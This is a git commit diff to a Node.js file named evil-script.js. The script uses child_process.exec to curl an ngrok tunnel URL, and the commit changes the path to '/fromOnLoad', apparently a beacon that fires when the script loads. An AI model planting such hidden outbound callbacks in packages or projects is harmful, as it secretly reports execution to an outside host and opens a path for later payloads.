80d45bd1ce11c18fcd0eeec5a4e8f1623bb2e784
guy677 <64982216+guy677@users.noreply.github.com>
2022-06-08 14:49:03 +0300

    Update evil-script.js

--- evil-script.js
+++ evil-script.js
@@ -1,6 +1,6 @@
 var exec = require('child_process').exec;
 
-exec('curl https://5675-77-137-20-251.eu.ngrok.io',
+exec('curl https://5675-77-137-20-251.eu.ngrok.io/fromOnLoad',
     function (error, stdout, stderr) {
         console.log('stdout: ' + stdout);
         console.log('stderr: ' + stderr);
